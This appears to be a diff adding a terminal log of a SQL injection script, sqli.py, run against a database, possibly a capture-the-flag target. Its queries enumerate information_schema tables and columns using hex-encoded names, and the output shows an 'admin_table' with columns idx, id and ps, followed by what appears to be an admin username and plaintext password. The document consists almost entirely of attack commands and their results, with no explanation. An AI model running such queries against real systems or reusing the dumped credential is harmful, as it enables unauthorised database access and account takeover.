@@ -1,0 +1,12 @@
+python .\sqli.py "select table_name from information_schema.tables where table_schema=0x69705f6c6f675f7461626c65 limit 1"
+admin_table
+
+python .\sqli.py "select column_name from information_schema.columns where table_schema=0x69705f6c6f675f7461626c65 and table_name=0x61646d696e5f7461626c65 limit 1"
+
+idx
+id 
+ps
+
+
+blue_admin
+0h~myp4ss!
